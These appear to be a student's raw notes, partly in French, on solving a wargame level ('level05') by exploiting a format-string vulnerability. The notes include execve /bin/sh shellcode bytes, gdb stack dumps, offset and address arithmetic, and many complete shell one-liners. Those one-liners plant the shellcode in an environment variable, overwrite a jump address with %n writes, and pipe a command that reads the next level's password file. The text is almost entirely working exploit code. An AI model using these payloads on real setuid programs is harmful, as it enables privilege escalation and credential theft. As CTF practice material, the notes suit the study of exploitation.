array = 0xffffd698

ecit jmp = 0x804837b 
need 0x804837b+1

'\x08\x04\x83\x7b'[::-1]

0x58    0xfe    0xff    0xff


p 0xffffd6ef - 0xffffd6a8

array in 42= 0xffffd6a8 = '/xff/xff/xd6/xa8'[::-1]

offset = 0x47 or 77 in dec

0xffffd6ef





0x29    0x85    0x04    0x08 = 0xffffd708

0x08048529



\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80

echo $(python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + '%4.x'*3 + 'a'*(168 - 24 - (4 * 3)) +  '%n' )")

j
 x1�vh//shh/bin��1ɉ�̀  64f7fcfac0f7ec3addffffd6efffffd6ee    ffffffffffffd774f7fdb00031780b6a2f6876f66868732f6e69622fc931e38980cdca89782e3425782e3425782e3425


address tableau printf		: 0xffffd6a8
							   `-> str
addr address return printf	: 0xffffd67c
							   `->0x0804850c

0xffffd670 + 12

adresse str dans printf		: 0xffffd6a8



<<< $(python -c "print('%x'*1)")


0xffffd660:     0xf7fcfa20      0xffffd6a8      0xffffd684      0xf7e78480
0xffffd670:     0xffffd6a8      0xf7ffd918      0x00000005      0x0804850c
0xffffd680:     0xffffd6a8      0x00000064      0xf7fcfac0      0xf7ec3add
0xffffd690:     0xffffd6cf      0xffffd6ce      0x00000000      0xffffffff
0xffffd6a0:     0xffffd754      0x00000000      0x74736574      0xf7e5000a
0xffffd6b0:     0x08048271      0x00000000      0x00000000      0x00000001
0xffffd6c0:     0xffffd8d9      0x0000002f      0xffffd71c      0xf7fceff4
0xffffd6d0:     0x08048520      0x080497c8      0x00000001      0x08048321


x/1wx 0xffffd67c

python -c "print('\x7c\xd6\xff\xff' + '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + '%4.x'*9 + '%n' )" |  ./level05
N = 58

$(python -c "print('\x7c\xd6\xff\xff' + '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + '%4.x'*8 + '%84.c' + '%n' )")
N = 0xc6

$(python -c "print('\x7c\xd6\xff\xff'  + 'AAAA'  + '\x7e\xd6\xff\xff' + '\x7f\xd6\xff\xff' + '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + '%x'*8 + '%54877.c' + '%n' + '%71.c' + '%n' + '%n')")

4*4 + 24 + 2*8 + 8 + 2


\x6a\x0b
> \x78
\x31\xf6
> \x76
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80



export F='\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'

TEMPLATE :
echo $(echo $(unset $(env | cut -d= -f1); export F=$(python -c "(print '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/usr/bin/python -c "print('adr0' + 'a'*4 + 'adr1' + 'a'*4 + 'addr2' + 'a'*4 + 'adr3' + '%.x'*x + '%n' + 'a'*0 + '%n' + 'a'*0 + '%n' + '%n') " ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))

need :
 - addr de F pour calculer 
 - addr de jump de exit ou de printf
 - nombre de %x pour retomber sur notre string
 - calculer combien il faut mettre d'arg

addr de jump printf = 0xffffdd1c = '\xff\xff\xdd\x1c'[::-1] 
nombre de %x = 9


 test 1 = 
 echo $(echo $(unset $(env | cut -d= -f1); export F=$(python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/usr/bin/python -c "print('\xff\xff\xdd\x1c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x1d'[::-1] + 'a'*4 + '\xff\xff\xdd\x1e'[::-1] + 'a'*4 + '\xff\xff\xdd\x1f'[::-1] + '%.x'*9 + '%n' + 'a'*0 + '%n' + 'a'*0 + '%n' + '%n') " ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))



dans gdb  = 
 - virer l'env = unset environment
 - insert F = set environment F =
 - echo $(python -c "(print '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')") > /tmp/shell

 - BIEN VIRER COL & ROW = show environment
 - run program = echo $(python -c "print('\xff\xff\xdd\x1c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x1d'[::-1] + 'a'*4 + '\xff\xff\xdd\x1e'[::-1] + 'a'*4 + '\xff\xff\xdd\x1f'[::-1] + '%.x'*9 + '%n' + 'a'*0 + '%n' + 'a'*0 + '%n' + '%n')") > /tmp/in
 - r < /tmp/in 




   echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/usr/bin/python -c "print('\xff\xff\xdd\x1c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x1d'[::-1] + 'a'*4 + '\xff\xff\xdd\x1e'[::-1] + 'a'*4 + '\xff\xff\xdd\x1f'[::-1] + '%17.x'*9 + '%5.c' + '%n' + '%39.c' + '%n' + '%32.c' + '%n' + '%n')" ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))


echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); ./a.out)) = 
0xffffdfc7 = with no arg and command = 0xffffdfb8

uncompile in octet F =  0xffffdfb8 ||| shellcode = 0xffffdfb8+2 = ba

ba = 186
df = 223
ff = 255

change x to number of carac

printf = (4 * 7) + (17 * 9) + 5 = 186
fget = (4 * 7) + (5 * 9) + 4 = 77

printf = 223 - 184 = 39
fget = 77 + 2 + 5 = 84

printf = 255 - 223 = 32
fget = 84 + 2 + 5 = 91

printf = 255 - 255 = 0
fget = 91 + 2 = 93

0xffffdd6c

$(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + 'a'*4 + '\xff\xff\xdd\x6f'[::-1] + '%17.x'*9 + 'a'*5 + '%n' + '%39.c' + '%n' + '%32.c' + '%n' + '%n')") > /tmp/in


in gdb shellcode = x/s 0xffffdfb8-21 = 0xffffdfa3

refaire tout avec les bon carac = 
163  au lieu de 184 
163 - 7 * 4 = 136 = 15 * 9 + 1

223 - 163 = 60

echo $(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')") > /tmp/in



(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')") 


 echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')" ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))

 gdb	-> echo $(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')") > /tmp/in
		->  export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')")



echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/bin/cat /tmp/in ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05)

### work on gdb 
- echo $(/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')") > /tmp/in
- export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')")
- gdb level05
- layout asm
- unset environment (toutes les env sauf F)
- r < /tmp/in
- OK good ca nous lance un shell dans gdb (pourquoi pas en vrai ?)


#### ques ce qui peux tout deplacer ?
 - l'env peux etre gdb a encore un env ?
 - l'ARGV[1] peux surment tout deplacer dans la memoire 
 - es ce que le fait d'ecrire unset env declade avant le `;` ?




  echo $(echo $(unset $(env | cut -d= -f1); export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1] + '%15.x'*9 + 'a'*4 + '%n' + '%60.c' + '%n' + '%32.c' + '%n' + '%n')" ; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))


    echo $(
	echo $(
		unset $(
			env | cut -d= -f1
			);
		export F=$(/usr/bin/python -c "print( '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80')"); (
					/usr/bin/python -c "print('\xff\xff\xdd\x6c'[::-1]  + 'a'*4 + '\xff\xff\xdd\x6d'[::-1] + 'a'*4 + '\xff\xff\xdd\x6e'[::-1] + '\xff\xff\xdd\x6f'[::-1]+'%15.x'*9+'a'*4+'%n'+'%60.c'+'%n' + '%32.c' + '%n' + '%n')";
					/bin/echo '/bin/cat /home/users/level06/.pass'
				) | /home/users/level05/level05 ))